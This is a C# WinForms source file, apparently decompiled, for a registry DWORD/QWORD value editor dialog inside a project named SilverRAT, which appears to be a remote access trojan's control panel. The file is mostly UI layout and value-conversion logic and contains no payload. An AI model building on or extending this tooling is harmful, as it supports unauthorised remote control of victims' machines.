using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using Microsoft.Win32;
using Server.Helper;
using System;
using System.ComponentModel;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class FormRegValueEditWord : Form
{
    private readonly RegistrySeeker.RegValueData _value;

    private const string DWORD_WARNING = "The decimal value entered is greater than the maximum value of a DWORD (32-bit number). Should the value be truncated in order to continue?";

    private const string QWORD_WARNING = "The decimal value entered is greater than the maximum value of a QWORD (64-bit number). Should the value be truncated in order to continue?";

    private IContainer components = null;

    private BunifuDragControl FormDragControl1;

    private BunifuElipse PanelElipse;

    private Panel panelForm;

    private Guna2ResizeBox FormResizeBox1;

    private Guna2CircleButton ButtClose;

    private BunifuLabel bunifuLabel1;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private Guna2GradientButton Save;

    private Label TxDecimal;

    private BunifuRadioButton radioDecimal;

    private Label TxradioHexa;

    private BunifuRadioButton radioHexa;

    private WordTextBox valueDataTxtBox;

    private Label label2;

    private TextBox valueNameTxtBox;

    private Label label1;

    public FormRegValueEditWord(RegistrySeeker.RegValueData value)
    {
        _value = value;
        InitializeComponent();
        MaximumSize = base.Size;
        MinimumSize = base.Size;
        valueNameTxtBox.Text = value.Name;
        if (value.Kind == RegistryValueKind.DWord)
        {
            Text = "Edit DWORD (32-bit) Value";
            valueDataTxtBox.Type = WordTextBox.WordType.DWORD;
            valueDataTxtBox.Text = Server.Helper.ByteConverter.ToUInt32(value.Data).ToString("x");
        }
        else
        {
            Text = "Edit QWORD (64-bit) Value";
            valueDataTxtBox.Type = WordTextBox.WordType.QWORD;
            valueDataTxtBox.Text = Server.Helper.ByteConverter.ToUInt64(value.Data).ToString("x");
        }
    }

    private void FormRegValueEditWord_Load(object sender, EventArgs e)
    {
        try
        {
            PanelElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
        }
        catch
        {
        }
    }

    private void Save_Click(object sender, EventArgs e)
    {
        if (valueDataTxtBox.IsConversionValid() || IsOverridePossible())
        {
            _value.Data = ((_value.Kind == RegistryValueKind.DWord) ? Server.Helper.ByteConverter.GetBytes(valueDataTxtBox.UInt32_0) : Server.Helper.ByteConverter.GetBytes(valueDataTxtBox.UInt64_0));
            base.Tag = _value;
            base.DialogResult = DialogResult.OK;
        }
        else
        {
            base.DialogResult = DialogResult.None;
        }
        Program.Silver.TransitionHiddeng.HideSync(panelForm);
        Close();
    }

    private void FormRegValueEditWord_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private DialogResult ShowWarning(string msg, string caption)
    {
        return MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
    }

    private bool IsOverridePossible()
    {
        string msg = ((_value.Kind == RegistryValueKind.DWord) ? "The decimal value entered is greater than the maximum value of a DWORD (32-bit number). Should the value be truncated in order to continue?" : "The decimal value entered is greater than the maximum value of a QWORD (64-bit number). Should the value be truncated in order to continue?");
        return ShowWarning(msg, "Overflow") == DialogResult.Yes;
    }

    private void radioHexa_CheckedChanged2(object sender, BunifuRadioButton.CheckedChangedEventArgs e)
    {
        if (valueDataTxtBox.IsHexNumber != radioHexa.Checked)
        {
            if (valueDataTxtBox.IsConversionValid() || IsOverridePossible())
            {
                valueDataTxtBox.IsHexNumber = radioHexa.Checked;
            }
            else
            {
                radioDecimal.Checked = true;
            }
        }
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            Close();
        }
        catch
        {
            Close();
        }
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.FormRegValueEditWord));
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.valueDataTxtBox = new Server.Helper.WordTextBox();
        this.label2 = new System.Windows.Forms.Label();
        this.valueNameTxtBox = new System.Windows.Forms.TextBox();
        this.label1 = new System.Windows.Forms.Label();
        this.TxDecimal = new System.Windows.Forms.Label();
        this.radioDecimal = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.TxradioHexa = new System.Windows.Forms.Label();
        this.radioHexa = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.Save = new Guna.UI2.WinForms.Guna2GradientButton();
        this.PanelElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm.SuspendLayout();
        base.SuspendLayout();
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.panelForm;
        this.FormDragControl1.Vertical = true;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.valueDataTxtBox);
        this.panelForm.Controls.Add(this.label2);
        this.panelForm.Controls.Add(this.valueNameTxtBox);
        this.panelForm.Controls.Add(this.label1);
        this.panelForm.Controls.Add(this.TxDecimal);
        this.panelForm.Controls.Add(this.radioDecimal);
        this.panelForm.Controls.Add(this.TxradioHexa);
        this.panelForm.Controls.Add(this.radioHexa);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.ButtClose);
        this.panelForm.Controls.Add(this.bunifuLabel1);
        this.panelForm.Controls.Add(this.ButtionMinimized);
        this.panelForm.Controls.Add(this.ButtonMaximized);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Controls.Add(this.Save);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(482, 244);
        this.panelForm.TabIndex = 574;
        this.panelForm.Visible = false;
        this.valueDataTxtBox.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.valueDataTxtBox.IsHexNumber = false;
        this.valueDataTxtBox.Location = new System.Drawing.Point(25, 137);
        this.valueDataTxtBox.MaxLength = 8;
        this.valueDataTxtBox.Name = "valueDataTxtBox";
        this.valueDataTxtBox.Size = new System.Drawing.Size(171, 20);
        this.valueDataTxtBox.TabIndex = 632;
        this.valueDataTxtBox.Type = Server.Helper.WordTextBox.WordType.DWORD;
        this.label2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.label2.AutoSize = true;
        this.label2.Location = new System.Drawing.Point(21, 119);
        this.label2.Name = "label2";
        this.label2.Size = new System.Drawing.Size(61, 13);
        this.label2.TabIndex = 630;
        this.label2.Text = "Value data:";
        this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
        this.valueNameTxtBox.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.valueNameTxtBox.BackColor = System.Drawing.Color.White;
        this.valueNameTxtBox.Location = new System.Drawing.Point(24, 91);
        this.valueNameTxtBox.Name = "valueNameTxtBox";
        this.valueNameTxtBox.ReadOnly = true;
        this.valueNameTxtBox.Size = new System.Drawing.Size(432, 20);
        this.valueNameTxtBox.TabIndex = 629;
        this.label1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.label1.AutoSize = true;
        this.label1.Location = new System.Drawing.Point(21, 74);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(66, 13);
        this.label1.TabIndex = 631;
        this.label1.Text = "Value name:";
        this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
        this.TxDecimal.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxDecimal.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.TxDecimal.AutoSize = true;
        this.TxDecimal.BackColor = System.Drawing.Color.Transparent;
        this.TxDecimal.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxDecimal.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TxDecimal.ForeColor = System.Drawing.Color.Black;
        this.TxDecimal.Location = new System.Drawing.Point(332, 139);
        this.TxDecimal.Name = "TxDecimal";
        this.TxDecimal.Size = new System.Drawing.Size(50, 15);
        this.TxDecimal.TabIndex = 628;
        this.TxDecimal.Text = "Decimal";
        this.radioDecimal.AllowBindingControlLocation = false;
        this.radioDecimal.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.radioDecimal.BackColor = System.Drawing.Color.Transparent;
        this.radioDecimal.BindingControl = this.TxDecimal;
        this.radioDecimal.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.radioDecimal.BorderThickness = 1;
        this.radioDecimal.Checked = false;
        this.radioDecimal.Cursor = System.Windows.Forms.Cursors.Hand;
        this.radioDecimal.Location = new System.Drawing.Point(308, 137);
        this.radioDecimal.Name = "radioDecimal";
        this.radioDecimal.OutlineColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.radioDecimal.OutlineColorTabFocused = System.Drawing.Color.FromArgb(255, 192, 128);
        this.radioDecimal.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.radioDecimal.RadioColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.radioDecimal.RadioColorTabFocused = System.Drawing.Color.FromArgb(255, 192, 128);
        this.radioDecimal.Size = new System.Drawing.Size(21, 21);
        this.radioDecimal.TabIndex = 627;
        this.radioDecimal.Text = null;
        this.TxradioHexa.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxradioHexa.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.TxradioHexa.AutoSize = true;
        this.TxradioHexa.BackColor = System.Drawing.Color.Transparent;
        this.TxradioHexa.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxradioHexa.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TxradioHexa.ForeColor = System.Drawing.Color.Black;
        this.TxradioHexa.Location = new System.Drawing.Point(226, 139);
        this.TxradioHexa.Name = "TxradioHexa";
        this.TxradioHexa.Size = new System.Drawing.Size(76, 15);
        this.TxradioHexa.TabIndex = 626;
        this.TxradioHexa.Text = "Hexadecimal";
        this.radioHexa.AllowBindingControlLocation = false;
        this.radioHexa.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.radioHexa.BackColor = System.Drawing.Color.Transparent;
        this.radioHexa.BindingControl = this.TxradioHexa;
        this.radioHexa.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.radioHexa.BorderThickness = 1;
        this.radioHexa.Checked = true;
        this.radioHexa.Cursor = System.Windows.Forms.Cursors.Hand;
        this.radioHexa.Location = new System.Drawing.Point(202, 137);
        this.radioHexa.Name = "radioHexa";
        this.radioHexa.OutlineColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.radioHexa.OutlineColorTabFocused = System.Drawing.Color.FromArgb(255, 192, 128);
        this.radioHexa.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.radioHexa.RadioColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.radioHexa.RadioColorTabFocused = System.Drawing.Color.FromArgb(255, 192, 128);
        this.radioHexa.Size = new System.Drawing.Size(21, 21);
        this.radioHexa.TabIndex = 625;
        this.radioHexa.Text = null;
        this.radioHexa.CheckedChanged2 += new System.EventHandler<Bunifu.UI.WinForms.BunifuRadioButton.CheckedChangedEventArgs>(radioHexa_CheckedChanged2);
        this.FormResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(456, 217);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 604;
        this.FormResizeBox1.TargetControl = this;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(457, 9);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.25f, System.Drawing.FontStyle.Bold);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(10, 9);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(100, 15);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "RegValueEditWord";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(409, 9);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.ButtonMaximized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(244, 190, 83);
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(433, 9);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 574;
        this.ButtonMaximized.Click += new System.EventHandler(ButtonMaximized_Click);
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(142, 233);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(196, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 74);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 101);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(142, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(196, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(472, 74);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 101);
        this.PanelRight.TabIndex = 591;
        this.Save.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.Save.Animated = true;
        this.Save.BackColor = System.Drawing.Color.White;
        this.Save.BorderRadius = 1;
        this.Save.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Save.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Save.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Save.CheckedState.Parent = this.Save;
        this.Save.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Save.CustomImages.Parent = this.Save;
        this.Save.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Save.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Save.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.Save.ForeColor = System.Drawing.Color.White;
        this.Save.HoverState.Parent = this.Save;
        this.Save.Location = new System.Drawing.Point(364, 187);
        this.Save.Name = "Save";
        this.Save.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.Save.PressedDepth = 50;
        this.Save.ShadowDecoration.Parent = this.Save;
        this.Save.Size = new System.Drawing.Size(86, 25);
        this.Save.TabIndex = 574;
        this.Save.Text = "OK";
        this.Save.Click += new System.EventHandler(Save_Click);
        this.PanelElipse.ElipseRadius = 4;
        this.PanelElipse.TargetControl = this.panelForm;
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(506, 268);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "FormRegValueEditWord";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "FormRegValueEditWord";
        base.TopMost = true;
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.Load += new System.EventHandler(FormRegValueEditWord_Load);
        base.Shown += new System.EventHandler(FormRegValueEditWord_Shown);
        this.panelForm.ResumeLayout(false);
        this.panelForm.PerformLayout();
        base.ResumeLayout(false);
    }
}
